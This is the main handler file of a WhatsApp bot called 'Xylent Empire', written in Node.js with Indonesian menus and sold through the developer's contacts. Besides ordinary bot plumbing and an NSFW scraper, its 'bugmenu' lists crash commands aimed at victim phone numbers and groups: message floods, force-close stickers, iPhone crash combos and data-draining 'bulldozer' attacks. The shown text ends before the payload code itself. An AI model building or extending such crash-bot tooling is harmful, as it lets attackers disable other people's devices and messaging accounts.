require('./config');
const fs = require('fs');
const axios = require('axios');
const chalk = require("chalk");
const util = require("util");
const moment = require("moment-timezone");
const path = require("path")
const os = require('os')
const vm = require('vm');
const sharp = require('sharp')
const pino = require('pino');
const didyoumean = require('didyoumean');
const similarity = require('similarity');
const figlet = require('figlet');
const gradient = require('gradient-string');
const readline = require("readline");
const logger = pino({ level: 'debug' });
const search = require("yt-search");
const { youtube } = require("btch-downloader");
const { Client } = require('ssh2');
const crypto = require('crypto');
const cheerio = require('cheerio');
const deniedCooldown = new Map();
const COOLDOWN = 5 * 60 * 1000;

const {
    spawn, 
    exec,
    execSync 
   } = require('child_process');
const { makeWASocket, makeCacheableSignalKeyStore, downloadContentFromMessage, emitGroupParticipantsUpdate, emitGroupUpdate, generateWAMessageContent, generateWAMessage, makeInMemoryStore, prepareWAMessageMedia, generateWAMessageFromContent, MediaType, areJidsSameUser, WAMessageStatus, downloadAndSaveMediaMessage, AuthenticationState, GroupMetadata, initInMemoryKeyStore, getContentType, MiscMessageGenerationOptions, useSingleFileAuthState, BufferJSON, WAMessageProto, MessageOptions, WAFlag, WANode, WAMetric, ChatModification, MessageTypeProto, WALocationMessage, ReconnectMode, WAContextInfo, proto, WAGroupMetadata, ProxyAgent, waChatKey, MimetypeMap, MediaPathMap, WAContactMessage, WAContactsArrayMessage, WAGroupInviteMessage, WATextMessage, WAMessageContent, WAMessage, BaileysError, WA_MESSAGE_STATUS_TYPE, MediaConnInfo, URL_REGEX, WAUrlInfo, WA_DEFAULT_EPHEMERAL, WAMediaUpload, mentionedJid, processTime, Browser, MessageType, Presence, WA_MESSAGE_STUB_TYPES, Mimetype, relayWAMessage, Browsers, GroupSettingChange, DisconnectReason, WASocket, getStream, WAProto, isBaileys, PHONENUMBER_MCC, AnyMessageContent, useMultiFileAuthState, fetchLatestBaileysVersion, templateMessage, InteractiveMessage, generateForwardMessageContent, jidDecode, Header } = require('@whiskeysockets/baileys')

module.exports = xylent = async (xylent, m, chatUpdate, store) => {
    try {
        const body = (
            m.mtype === "conversation" ? m.message.conversation :
            m.mtype === "imageMessage" ? m.message.imageMessage.caption :
            m.mtype === "videoMessage" ? m.message.videoMessage.caption :
            m.mtype === "extendedTextMessage" ? m.message.extendedTextMessage.text :
            m.mtype === "buttonsResponseMessage" ? m.message.buttonsResponseMessage.selectedButtonId :
            m.mtype === "listResponseMessage" ? m.message.listResponseMessage.singleSelectReply.selectedRowId :
            m.mtype === "templateButtonReplyMessage" ? m.message.templateButtonReplyMessage.selectedId :
            m.mtype === "interactiveResponseMessage" ? JSON.parse(m.msg.nativeFlowResponseMessage.paramsJson).id :
            m.mtype === "templateButtonReplyMessage" ? m.msg.selectedId :
            m.mtype === "messageContextInfo" ? m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text : "");
        const content = JSON.stringify(m.message)
        
        const isText = ["extendedTextMessage", "conversation"].includes(m.mtype)
		const isImage = ["imageMessage"].includes(m.mtype)
		const isVideo = ["videoMessage"].includes(m.mtype)
		const isSticker = ["stickerMessage"].includes(m.mtype)
		const isAudio = ["audioMessage"].includes(m.mtype) && !(m.message[m.mtype]?.ptt)
		const isVoice = ["audioMessage"].includes(m.mtype) && !!(m.message[m.mtype]?.ptt)
		const isViewOnce = ["viewOnceMessageV2", "viewOnceMessage"].includes(m.mtype)
		const isContact = ["contactMessage", "contactsArrayMessage"].includes(m.mtype)
		const isLocation = ["locationMessage"].includes(m.mtype)
		const isDocument = ["documentMessage", "documentWithCaptionMessage"].includes(m.mtype)
		const isProtocol = ["protocolMessage"].includes(m.mtype)
		const isPollUpdate = ["pollUpdateMessage"].includes(m.mtype)
		const isPollCreation = ["pollCreationMessage"].includes(m.mtype)
		const isButtonList = ["interactiveResponseMessage"].includes(m.mtype)
		const isButtonReply = ["templateButtonReplyMessage"].includes(m.mtype)
		const isAllMedia = ["imageMessage", "videoMessage", "stickerMessage", "audioMessage", "viewOnceMessageV2", "viewOnceMessage", "contactMessage", "contactsArrayMessage", "locationMessage", "documentMessage", "documentWithCaptionMessage"].includes(m.mtype)
		const isQuotedViewOnce = m.mtype === "extendedTextMessage" && content.includes("viewOnceMessage")
        
        const sender = m.key.fromMe ? xylent.user.id.split(":")[0] + "@s.whatsapp.net" || xylent.user.id
: m.key.participant || m.key.remoteJid;
        
        const senderNumber = sender.split('@')[0];
        const budy = (typeof m.text === 'string' ? m.text : '');
        const prefa = global.prefa
        const prefixRegex = /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/;
        const prefix = prefixRegex.test(body) ? body.match(prefixRegex)[0] : ''
        const from = m.key.remoteJid;
        const isGroup = from.endsWith("@g.us");
        const premium = JSON.parse(fs.readFileSync("./database/premium.json"))
        const reseller = JSON.parse(fs.readFileSync("./database/reseller.json"))
        const contacts = JSON.parse(fs.readFileSync("./database/ctcs.json"))
        const unli = JSON.parse(fs.readFileSync("./database/unli.json"))
        const OWNER_PATH = "./database/owner.json"
        const ownerbot = JSON.parse(fs.readFileSync(OWNER_PATH))
        const isOwner = ownerbot.includes(sender)
        const isUnli = unli.includes(m.chat)
        const botNumber = await xylent.decodeJid(xylent.user.id);
        const isPremium = premium.includes(m.sender)
        const isReseller = reseller.includes(m.sender)
        const isCmd = body.startsWith(prefix);
        const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : '';
        const command2 = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
        const args = body.trim().split(/ +/).slice(1);
        const pushname = m.pushName || "No Name";
        const isCreator = [botNumber, ...ownerbot, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender);
        const text = q = args.join(" ");
        const quoted = m.quoted ? m.quoted : m;
        const mime = (quoted.msg || quoted).mimetype || '';
        const qmsg = (quoted.msg || quoted);
        const isMedia = /image|video|sticker|audio/.test(mime);
        const groupMetadata = isGroup ? await xylent.groupMetadata(m.chat).catch((e) => {}) : "";
        const groupOwner = isGroup ? groupMetadata.owner : "";
        const groupName = m.isGroup ? groupMetadata.subject : "";
        const participants = isGroup ? await groupMetadata.participants : "";
        const groupAdmins = isGroup ? await participants.filter((v) => v.admin !== null).map((v) => v.id) : "";
        const groupMembers = isGroup ? groupMetadata.participants : "";
        const isGroupAdmins = isGroup ? groupAdmins.includes(m.sender) : false;
        const isBotGroupAdmins = isGroup ? groupAdmins.includes(botNumber) : false;
        const isBotAdmins = isGroup ? groupAdmins.includes(botNumber) : false;
        const isAdmins = isGroup ? groupAdmins.includes(m.sender) : false;        
        const { smsg, formatp, tanggal, formatDate, getTime, isUrl, sleep, clockString, runtime, fetchJson, getBuffer, jsonformat, format, parseMention, getRandom, getGroupAdmins, capital } = require('./library/myfunction');

// Foto
const nika = fs.readFileSync('./image/Empire.jpg')
const img = fs.readFileSync('./image/Xylent.jpg')
const musik = fs.readFileSync('./image/musik1.mp3')

const {
    imageToWebp, 
    videoToWebp, 
    writeExifImg, 
    writeExifVid, 
    writeExif, 
    addExif 
} = require('./library/exif')      

// Database Maklu
const keamanan = 'https://raw.githubusercontent.com/PinzyOffc/XylentDb/refs/heads/main/nomor.json';
let registeredBotNumbers = [];

async function loadBotDatabase() {
    try {
        const res = await axios.get(keamanan);
        registeredBotNumbers = Array.isArray(res.data.numbers) ? res.data.numbers : [];
    } catch (e) {
    }
}

function isBotNumberRegistered(botNumber) {
    const botNum = botNumber.split("@")[0];
    if (!Array.isArray(registeredBotNumbers)) return false;
    return registeredBotNumbers.includes(botNum);
}
if (!registeredBotNumbers.length) {
    await loadBotDatabase();
}

if (!xylent.public && !isCreator) return;

if (m.message) {
    console.log(chalk.cyan.bold(`▢ New Message`));
    console.log(
        chalk.blue(
            `   ⌬ Tanggal: ${new Date().toLocaleString()} \n` +
            `   ⌬ Pesan: ${m.body || m.mtype} \n` +
            `   ⌬ Pengirim: ${pushname} \n` +
            `   ⌬ JID: ${senderNumber}`
        )
    );
    
    if (m.isGroup) {
        console.log(
            chalk.blue(
                `   ⌬ Grup: ${groupName} \n` +
                `   ⌬ GroupJid: ${m.chat}`
            )
        );
    }
    console.log();
}

// Function
function getGreeting(hour) {
  if (hour >= 0 && hour < 5) return "Late Night 🌌";
  else if (hour >= 5 && hour < 10) return "Good Morning 🌅";
  else if (hour >= 10 && hour < 15) return "Good Noon 🌄";
  else if (hour >= 15 && hour < 18) return "Good Afternoon 🌇";
  else if (hour >= 18 && hour < 19) return "Good Evening 🌆";
  else if (hour >= 19 && hour < 23) return "Good Night 🌃";
  else return "Midnight 🌌";
}

const nowJakarta = moment().tz('Asia/Jakarta');
const nowMakassar = moment().tz('Asia/Makassar');
const nowJayapura = moment().tz('Asia/Jayapura');
const hariIni = nowJakarta.format('dddd, DD MMMM YYYY');
const wib = nowJakarta.format('HH:mm:ss');
const wita = nowMakassar.format('HH:mm:ss');
const wit = nowJayapura.format('HH:mm:ss');   
const ucapanJakarta = getGreeting(parseInt(nowJakarta.format('HH')));
const ucapanMakassar = ucapanJakarta;
const ucapanJayapura = ucapanJakarta;

const example = (teks) => {
return `\n *Cara Penggunaan Command :*\n *${prefix+command}* ${teks}\n`
}
  
const qkontak = {
key: {
participant: `0@s.whatsapp.net`,
...(botNumber ? {
remoteJid: `status@broadcast`
} : {})
},
message: {
'contactMessage': {
'displayName': `const Empire = PinzyX7`,
'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;ttname,;;;\nFN:ttname\nitem1.TEL;waid=62895327469719:62895327469719\nitem1.X-ABLabel:Ponsel\nEND:VCARD`,
sendEphemeral: true
}}
}

if (global.owneroff && !isCmd) {
  if (!isGroup && !isOwner) {
    const teks = `( 👋 ) Hallo Kak @${m.sender.split('@')[0]} Maaf Ya Tuanku Sedang Offline Saat Ini.\nJika Ada Sesuatu Yang Penting Silahkan Tinggalkan Pesan Saja!`;
    return client.sendMessage(m.chat, {
      text: teks,
      contextInfo: {
        mentionedJid: [m.sender],
        externalAdReply: {
          showAdAttribution: true,
          thumbnail: fs.readFileSync("./image/Empire.jpg"),
          renderLargerThumbnail: false,
          title: "｢ OWNER SEDANG OFFLINE ｣",
          mediaUrl: "https://wa.me/6285183387097",
          sourceUrl: "https://whatsapp.com/channel/0029Vb7LQp1AojYtRXxiCT2U",
          previewType: "PHOTO"
        }
      }
    }, { quoted: m });
  }
}

if (global.maintenance && isCmd) {
  if (!isCreator) {
    const teksMaint = `( 👋 ) Hallo Kak @${m.sender.split('@')[0]} Maaf Ya Sistem Kami Sedang Dalam *Maintenance Mode*.\nSilahkan Tunggu Beberapa Saat, Bot Akan Segera Kembali Online! 🙏\nJika Kakak Mau Request Fitur Di Bot Bisa Gunakan *reqfitur* Otomatis Bot Akan Kirim Pesan Ke Owner!.`;
    return xylent.sendMessage(m.chat, {
      text: teksMaint,
      contextInfo: {
        mentionedJid: [m.sender],
        externalAdReply: {
          showAdAttribution: true,
          thumbnail: fs.readFileSync("./image/Empire.jpg"),
          renderLargerThumbnail: false,
          title: "｢ SISTEM MAINTENANCE ｣",
          mediaUrl: "https://wa.me/6285183387097",
          sourceUrl: "https://whatsapp.com/channel/0029Vb7LQp1AojYtRXxiCT2U",
          previewType: "PHOTO"
        }
      }
    }, { quoted: m });
  }
}

const reaction = async (jidss, emoji) => {
   client.sendMessage(jidss, {
          react: {
                    text: emoji,
                    key: m.key 
         } 
   })
};

const lol = {
  key: {
    fromMe: false,
    participant: "0@s.whatsapp.net",
    remoteJid: "status@broadcast"
  },
  message: {
    liveLocationMessage: {
      degreesLatitude: -6.9175,
      degreesLongitude: 107.6191,
      caption: "𝗫𝘆𝗹𝗲𝗻𝘁 𝗘𝗺𝗽𝗶𝗿𝗲", 
      sequenceNumber: "1656662991",
      contextInfo: {
        forwardingScore: 999999,
        isForwarded: true
      }
    }
  }
}

const DB_URL = 'https://raw.githubusercontent.com/DAFARELXP/BLOODDB/refs/heads/main/dbwa.json';
const DB_PATH = './dbwa.json';

// Fungsi load DB
async function loadDB() {
  if (fs.existsSync(DB_PATH)) {
    return JSON.parse(fs.readFileSync(DB_PATH));
  }
  const res = await axios.get(DB_URL);
  return res.data;
}

// Fungsi save DB
function saveDB(data) {
  fs.writeFileSync(DB_PATH, JSON.stringify(data, null, 2));
}

const reply = async (teks) => {
let mentionList = []
let regex = /@?(\d{8,15})/g
let match
while ((match = regex.exec(teks)) !== null) {
mentionList.push(match[1] + "@s.whatsapp.net")
}
await xylent.sendMessage(
m.chat,
{
document: { url: "https://t.me/Pinnxzy" },
mimetype: "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
fileName: "𝗫𝘆𝗹𝗲𝗻𝘁 𝗘𝗺𝗽𝗶𝗿𝗲",
fileLength: 999999999999999,
pageCount: 99999,
caption: teks,
viewOnce: true,
headerType: 6,
contextInfo: {
mentionedJid: mentionList,
forwardingScore: 999999,
isForwarded: true,
forwardedNewsletterMessageInfo: {
newsletterJid: "120363424874566521@newsletter",
serverMessageId: 1,
newsletterName: "PinzyX7 | Xylent Empire"
},
externalAdReply: {
body: "Pinzy.repeat(24)",
containsAutoReply: true,
mediaType: 1,
mediaUrl: "peler",
renderLargerThumbnail: false,
showAdAttribution: false,
sourceId: "Tes",
sourceType: "PDF",
previewType: "PDF",
sourceUrl: "https://t.me/Pinnxzy",
thumbnail: fs.readFileSync("./image/Xylent.jpg"),
thumbnailUrl: fs.readFileSync("./image/Empire.jpg"),
title: "𝗫𝘆𝗹𝗲𝗻𝘁 𝗘𝗺𝗽𝗶𝗿𝗲"
}
}
},
{ quoted: lol }
)
}
// Nika Eai
const xylentbut = (anu) => {
const {message, key} = generateWAMessageFromContent(m.chat, {
  interactiveMessage: {
    body: {text: anu},
    footer: {text: `Xylent-AI`},
    nativeFlowMessage: {
      buttons: [{text: "🜲 Xylent Empire"}
           ],
    }
  },
}, {quoted: { key: { participant: '0@s.whatsapp.net', remoteJid: "0@s.whatsapp.net" }, message: { conversation: `XYLENT - AI`}}})
 xylent.relayMessage(m.chat, {viewOnceMessage:{message}}, {messageId:key.id})
}

// Fansen Nsfw
async function randomNsFw() {
			return new Promise((resolve, reject) => {
				const page = Math.floor(Math.random() * 1153)
				axios.get('https://sfmcompile.club/page/' + page).then((data) => {
					const $ = cheerio.load(data.data)
					const hasil = []
					$('#primary > div > div > ul > li > article').each(function (a, b) {
						hasil.push({
							title: $(b).find('header > h2').text(),
							link: $(b).find('header > h2 > a').attr('href'),
							category: $(b).find('header > div.entry-before-title > span > span').text().replace('in ', ''),
							share_count: $(b).find('header > div.entry-after-title > p > span.entry-shares').text(),
							views_count: $(b).find('header > div.entry-after-title > p > span.entry-views').text(),
							type: $(b).find('source').attr('type') || 'image/jpeg',
							video_1: $(b).find('source').attr('src') || $(b).find('img').attr('data-src'),
							video_2: $(b).find('video > a').attr('href') || ''
						})
					})
					resolve(hasil)
				})
			})
		}

// Reply Text
const ReplyXylent = async (teks) => {
  let mentionList = []
  let regex = /@?(\d{8,15})/g
  let match

  while ((match = regex.exec(teks)) !== null) {
    let number = match[1]
    let jid = number + "@s.whatsapp.net"
    mentionList.push(jid)
  }
  await xylent.sendMessage(
    m.chat,
    {
      text: teks,
      contextInfo: {
        mentionedJid: mentionList,
        forwardingScore: 999999,
        isForwarded: true,
        forwardedNewsletterMessageInfo: {
          newsletterJid: '120363421566496745@newsletter',
          serverMessageId: 145,
          newsletterName: 'Pinzy | Information Xylent',
        },
        externalAdReply: {
          showAdAttribution: false,
          containsAutoReply: true,
          title: 'const Empire = PinzyX7',
          body: 'const bot = Xylent Empire',
          previewType: 'VIDEO',
          thumbnailUrl: 'https://f.top4top.io/p_3788vut3d1.jpg',
          sourceUrl: 'https://whatsapp.com'
        }
      }
    },
    {
      quoted: {
        key: {
          fromMe: false,
          participant: '0@s.whatsapp.net',
          remoteJid: 'status@broadcast'
        },
        message: {
          conversation: '𝗫𝘆𝗹𝗲𝗻𝘁 𝗘𝗺𝗽𝗶𝗿𝗲'
        }
      }
    }
  )
}

async function replybug(teks, target) {
    let jid = (target || m.sender).split('@')[0]

    let msg = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
            message: {
                messageContextInfo: {
                    deviceListMetadata: {},
                    deviceListMetadataVersion: 2
                },
                interactiveMessage: proto.Message.InteractiveMessage.create({
                    contextInfo: {
                        mentionedJid: [m.sender],
                        forwardingScore: 999999,
                        isForwarded: true,
                        forwardedNewsletterMessageInfo: {
                            newsletterJid: "120363424874566521@newsletter",
                            newsletterName: `Pinzy | Information Xylent`,
                            serverMessageId: 145
                        }
                    },
                    body: proto.Message.InteractiveMessage.Body.create({
                        text: teks
                    }),
                    footer: proto.Message.InteractiveMessage.Footer.create({
                        text: `const Empire = PinzyX7`
                    }),
                    header: proto.Message.InteractiveMessage.Header.create({
                        title: ``,
                        subtitle: "",
                        hasMediaAttachment: true,
                        ...(await prepareWAMessageMedia({ image: { url: `https://f.top4top.io/p_3788vut3d1.jpg` } }, { upload: xylent.waUploadToServer })),
                    }),
                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                        buttons: [
                            {
                                name: "cta_url",
                                buttonParamsJson: `{\"display_text\":\"Buy Script Md\",\"url\":\"https://wa.me/6285183387097\",\"merchant_url\":\"https://pinzymarket.xylent.fun\"}`
                            },
                            {
                                name: "cta_url",
                                buttonParamsJson: `{\"display_text\":\"Cek Target\",\"url\":\"https://wa.me/${jid}\",\"merchant_url\":\"https://pinzymarket.xylent.fun\"}`
                            }
                        ],
                    }),
                })
            }
        }
    }, { quoted: m })

    await xylent.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
    })
}

// Reply Text Bak Gb
async function replybug2(teks) {
let msg = generateWAMessageFromContent(m.chat, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: {
mentionedJid: [m.sender],
forwardingScore: 999999,
isForwarded: true,
forwardedNewsletterMessageInfo: {
newsletterJid: "120363424874566521@newsletter",
newsletterName: `Pinzy | Information Xylent`,
serverMessageId: 145
}
},
body: proto.Message.InteractiveMessage.Body.create({
text: teks
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `const Empire = PinzyX7`
}),
header: proto.Message.InteractiveMessage.Header.create({
  title: ``,
  subtitle: "",
  hasMediaAttachment: true,
  ...(await prepareWAMessageMedia(
    { image: { url: "https://f.top4top.io/p_3788vut3d1.jpg" } },
    { upload: xylent.waUploadToServer }
  )),
}),
gifPlayback: true,
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
name: "cta_url",
buttonParamsJson: `{\"display_text\":\"Xylent Information\",\"url\":\"https://t.me/XylentOfficial\",\"merchant_url\":\"https://pinzymarket.xylent.fun\"}`
}],
}), })}
}}, {quoted: lol})
await xylent.relayMessage(msg.key.remoteJid, msg.message, {
messageId: msg.key.id
})
}

// Reply Database
async function replydebe(teks) {
let msg = generateWAMessageFromContent(m.chat, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: {
mentionedJid: [m.sender],
forwardingScore: 999999,
isForwarded: true,
forwardedNewsletterMessageInfo: {
newsletterJid: "120363424874566521@newsletter",
newsletterName: `Pinzy | Information Xylent`,
serverMessageId: 145
}
},
body: proto.Message.InteractiveMessage.Body.create({
text: teks
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `const Empire = PinzyX7`
}),
header: proto.Message.InteractiveMessage.Header.create({
  title: ``,
  subtitle: "",
  hasMediaAttachment: true,
  ...(await prepareWAMessageMedia(
    { image: { url: "https://f.top4top.io/p_3788vut3d1.jpg" } },
    { upload: xylent.waUploadToServer }
  )),
}),
gifPlayback: true,
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
name: "cta_url",
buttonParamsJson: `{\"display_text\":\"Buy Akses Script\",\"url\":\"https://wa.me/6285183387097\",\"merchant_url\":\"https://pinzymarket.xylent.fun\"}`
}],
}), })}
}}, {quoted: lol})
await xylent.relayMessage(msg.key.remoteJid, msg.message, {
messageId: msg.key.id
})
}

async function safeReplyDebe(teks) {
    const now = Date.now();
    const last = deniedCooldown.get(m.sender) || 0;
    if (now - last > COOLDOWN) {
        deniedCooldown.set(m.sender, now);
        await replydebe(teks);
    }
}

// Ya Anu Pokoknya
const isBotRegisteredNow = isBotNumberRegistered(botNumber);

if (!isBotRegisteredNow) {
    const teksIlegal = `> 「 🛡️ Protect Xylent 」
_________________________
( 👋 ) Hallo Kak, Seperti Nya Anda Mau Bypass Script Nya Ya!
*Nomor Anda :* ${botNumber.split('@')[0]}, Telah Kami Masukan Ke Dalam List Blacklist.
_________________________
👤 *Owner :* t.me/Pinnxzy | wa.me/6285183387097
📩 *Pesan Kami :* _Jika Mau Di Lepas Dari Blacklist Mohon Chat Admin Kami!_`;

    await safeReplyDebe(teksIlegal);
    return;
}
    
switch (command) {
    case "kiw":
    case "start":
    case "help":
    case "menu": {
    const nowJakarta = moment().tz('Asia/Jakarta');
    await xylent.sendMessage(m.chat, { react: { text: "🥶", key: m.key } });

    let teks = `\`「 𝗫𝘆𝗹𝗲𝗻𝘁 𝗘𝗺𝗽𝗶𝗿𝗲 」\``

    const msg = generateWAMessageFromContent(
        m.chat,
        {
            viewOnceMessage: {
                message: {
                    interactiveMessage: proto.Message.InteractiveMessage.create({
                        body: proto.Message.InteractiveMessage.Body.create({
                            text: teks
                        }),
                        footer: proto.Message.InteractiveMessage.Footer.create({
                            text: `[ ! ] 𝐎𝐥𝐚 \`${pushname}\` 時間 ${getGreeting(parseInt(nowJakarta.format('HH')))} 私はいつでもあなたを助ける準備ができているサスケボットワッツアップクラッシュです。
╭────────────────────
│─▢ \`「 𝐈𝐧𝐟𝐨𝐫𝐦𝐚𝐭𝐢𝐨𝐧 𝐁𝐨𝐭 」\`
│─▢  Name Bot : Xylent MD
│─▢  Version : 2.0.0
│─▢  Owner : Pinnxzy.t.me
│─▢  Channel : XylentOfficial.t.me
│─▢  Bot Mode : *${xylent.public ? "Public" : "Self"}*
│─▢  Your Status : *${isCreator ? "Creator 👑" : isPremium ? "Premium User 💎" : "User 😹"}*
│─▢  Runtime Panel : *${runtime(process.uptime())}*
│─▢  Type Script : Java Script
│─▢  Action : Bít.ly/PinzyDev
╰────────────────────
                            
const Xylent = PinzyX7`
                        }),
                        header: proto.Message.InteractiveMessage.Header.create({
                            hasMediaAttachment: true,
                            imageMessage: (
                                await prepareWAMessageMedia(
                                    { image: { url: "https://f.top4top.io/p_3788vut3d1.jpg" } },
                                    { upload: xylent.waUploadToServer }
                                )
                            ).imageMessage
                        }),
                        contextInfo: {
                            isForwarded: true,
                            forwardingScore: 999999,
                            forwardedNewsletterMessageInfo: {
                                newsletterJid: '120363424874566521@newsletter',
                                newsletterName: 'Pinzy | Information Xylent',
                                serverMessageId: 145
                            }
                        },
                        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                            messageParamsJson: JSON.stringify({
                                limited_time_offer: {
                                    text: "𝗫𝘆𝗹𝗲𝗻𝘁 𝗘𝗺𝗽𝗶𝗿𝗲",
                                    url: "https://t.me/Pinnxzy",
                                    copy_code: "const Xylent = PinzyX7",
                                    expiration_time: Date.now() * 999
                                },
                                bottom_sheet: {
                                    in_thread_buttons_limit: 2,
                                    divider_indices: [1, 2, 3, 4, 5],
                                    list_title: "CLICK",
                                    button_title: "SHOW MD MENU"
                                }
                            }),
                            buttons: [
                                {
                                    name: "single_select",
                                    buttonParamsJson: JSON.stringify({
                                        title: "SHOW MD MENU",
                                        sections: [{
                                            title: "List Menu",
                                            highlight_label: "Feature Xylent Top 🔥",
                                            rows: [
                                                { title: "「 All Menu 」", description: "Show All Feature Bot XYLENT EMPIRE", id: ".allmenu" },
                                                { title: "「 Bug Menu 」", description: "Show Bugs Feature Bot XYLENT EMPIRE", id: ".bugmenu" },
                                                { title: "「 Owner Menu 」", description: "Show Owner Feature Bot XYLENT EMPIRE", id: ".ownermenu" },
                                                { title: "「 Fun Menu 」", description: "Show Fun Feature Bot XYLENT EMPIRE", id: ".funmenu" },
                                                { title: "「 Cpanel Menu 」", description: "Show Cpanel Feature Bot XYLENT EMPIRE", id: ".cpanelmenu" },
                                                { title: "「 Nsfw Menu 」", description: "Show 18+ Feature Bot XYLENT EMPIRE!!", id: ".nsfwmenu" },
                                                { title: "「 Thanks To 」", description: "Show The Support Bot XYLENT EMPIRE", id: ".tqto" },
                                                { title: "「 Info Script 」", description: "Show Information Script Bot XYLENT EMPIRE", id: ".script" },
                                                { title: "「 Pinzy Informasi 」", description: "Show Information Developer Bot XYLENT EMPIRE", id: ".owner" }
                                            ]
                                        }]
                                    })
                                }
                            ]
                        })
                    })
                }
            }
        },
        { quoted: lol }
    );

    await xylent.relayMessage(m.chat, msg.message, { messageId: msg.key.id });

    await xylent.sendMessage(
        m.chat,
        {
            audio: fs.readFileSync("./image/musik1.mp3"),
            mimetype: "audio/mp4",
            ptt: false
        },
        { quoted: qkontak }
    );
}
break;

case "bugmenu": {
    const nowJakarta = moment().tz('Asia/Jakarta');
    await xylent.sendMessage(m.chat, { react: { text: "🔥", key: m.key } });

    let teks = `\`「 𝗫𝘆𝗹𝗲𝗻𝘁 𝗘𝗺𝗽𝗶𝗿𝗲 」\``

    const msg = generateWAMessageFromContent(
        m.chat,
        {
            viewOnceMessage: {
                message: {
                    interactiveMessage: proto.Message.InteractiveMessage.create({
                        body: proto.Message.InteractiveMessage.Body.create({
                            text: teks
                        }),
                        footer: proto.Message.InteractiveMessage.Footer.create({
                            text: `[ ! ] 𝐎𝐥𝐚 \`${pushname}\` 時間 ${getGreeting(parseInt(nowJakarta.format('HH')))} 私はいつでもあなたを助ける準備ができているサスケボットワッツアップクラッシュです。
╭────────────────────
│─▢ \`「 𝐈𝐧𝐟𝐨𝐫𝐦𝐚𝐭𝐢𝐨𝐧 𝐁𝐨𝐭 」\`
│─▢  Name Bot : Xylent MD
│─▢  Version : 2.0.0
│─▢  Owner : Pinnxzy.t.me
│─▢  Channel : XylentOfficial.t.me
│─▢  Bot Mode : *${xylent.public ? "Public" : "Self"}*
│─▢  Your Status : *${isCreator ? "Creator 👑" : isPremium ? "Premium User 💎" : "User 😹"}*
│─▢  Runtime Panel : *${runtime(process.uptime())}*
│─▢  Type Script : Java Script
│─▢  Action : Bít.ly/PinzyDev
╰────────────────────

╭──⧼ Bug Lock WhatsApp ⧽──
│─▢ .galaxy 628xxx 
│☇ Delay Hard One Msg
│─▢ .glict 628xxx
│☇ Delay Hard Bebas Spam
│─▢ .glory 628xxx
│☇ Bullodozer (Sedot Kouta )
│─▢ .imortal 628xxx 
│☇ Delay Combo Hard
│─▢ .honor 628xxx 
│☇ Stiker Blank Andro
│─▢ .mytic 628xxx 
│☇ Forclose Click Andro
│─▢ .crios 628xxx
│☇ IPhone Combo
╰───────────────────

╭──⧼ Bug Lock Group WhatsApp ⧽──
│─▢ .X7gb *Link Group*
│─▢ .neo *Link Group*
╰────────────────────────

╭──⧼ Tes Function WhatsApp ⧽──
│─▢ .testfunc *628xxx*
│─▢ .testgb *ID Group*
│─▢ .cekjid *jid/ id gb*
╰────────────────────────

const Xylent = PinzyX7`
                        }),
                        header: proto.Message.InteractiveMessage.Header.create({
                            hasMediaAttachment: true,
                            imageMessage: (
                                await prepareWAMessageMedia(
                                    { image: { url: "https://f.top4top.io/p_3788vut3d1.jpg" } },
                                    { upload: xylent.waUploadToServer }
                                )
                            ).imageMessage
                        }),
                        contextInfo: {
                            isForwarded: true,
                            forwardingScore: 999999,
                            forwardedNewsletterMessageInfo: {
                                newsletterJid: '120363424874566521@newsletter',
                                newsletterName: 'Pinzy | Information Xylent',
                                serverMessageId: 145
                            }
                        },
                        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                            messageParamsJson: JSON.stringify({
                                limited_time_offer: {
                                    text: "𝗫𝘆𝗹𝗲𝗻𝘁 𝗘𝗺𝗽𝗶𝗿𝗲",
                                    url: "https://t.me/Pinnxzy",
                                    copy_code: "const Xylent = PinzyX7",
                                    expiration_time: Date.now() * 999
                                },
                                bottom_sheet: {
                                    in_thread_buttons_limit: 2,
                                    divider_indices: [1, 2, 3, 4, 5],
                                    list_title: "CLICK",
                                    button_title: "SHOW MD MENU"
                                }
                            }),
                            buttons: [
                                {
                                    name: "single_select",
                                    buttonParamsJson: JSON.stringify({
                                        title: "SHOW MD MENU",
                                        sections: [{
                                            title: "List Menu",
                                            highlight_label: "Feature Xylent Top 🔥",
                                            rows: [
                                                { title: "「 All Menu 」", description: "Show All Feature Bot XYLENT EMPIRE", id: ".allmenu" },
                                                { title: "「 Owner Menu 」", description: "Show Owner Feature Bot XYLENT EMPIRE", id: ".ownermenu" },
                                                { title: "「 Fun Menu 」", description: "Show Fun Feature Bot XYLENT EMPIRE", id: ".funmenu" },
                                                { title: "「 Cpanel Menu 」", description: "Show Cpanel Feature Bot XYLENT EMPIRE", id: ".cpanelmenu" },
                                                { title: "「 Nsfw Menu 」", description: "Show 18+ Feature Bot XYLENT EMPIRE!!", id: ".nsfwmenu" },
                                                { title: "「 Thanks To 」", description: "Show The Support Bot XYLENT EMPIRE", id: ".tqto" },
                                                { title: "「 Info Script 」", description: "Show Information Script Bot XYLENT EMPIRE", id: ".script" },
                                                { title: "「 Pinzy Informasi 」", description: "Show Information Developer Bot XYLENT EMPIRE", id: ".owner" }
                                            ]
                                        }]
                                    })
                                }
                            ]
                        })
                    })
                }
            }
        },
